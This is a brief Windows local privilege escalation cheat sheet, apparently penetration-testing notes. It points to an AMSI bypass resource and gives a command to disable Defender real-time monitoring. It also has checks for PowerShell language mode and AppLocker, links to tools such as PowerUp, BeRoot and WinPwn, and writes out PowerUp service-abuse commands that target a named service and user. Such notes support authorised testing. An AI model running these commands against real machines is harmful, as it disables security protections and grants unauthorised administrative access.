# Local Privilege Escalation

## **Misc**

**AMSI Bypass**\
****amsi.fail

**Disable AV Protection/Monitoring**\
Set-MpPreference -DisableRealtimeMonitoring $true

**Check Powershell Language Mode**\
$ExecutionContext.SessionState.LanguageMode

**AppLocker Policy**\
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections



## PrivEsc Scripts

{% embed url="https://github.com/enjoiz/Privesc" %}

. .\privesc.ps1\
Invoke-PrivEsc

{% embed url="https://github.com/AlessandroZ/BeRoot./beRoot.exe" %}

./beroot.exe

{% embed url="https://github.com/HarmJ0y/PowerUp" %}

```
. ./powerup
Invoke-allchecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

{% embed url="https://github.com/S1ckB0y1337/WinPwn" %}
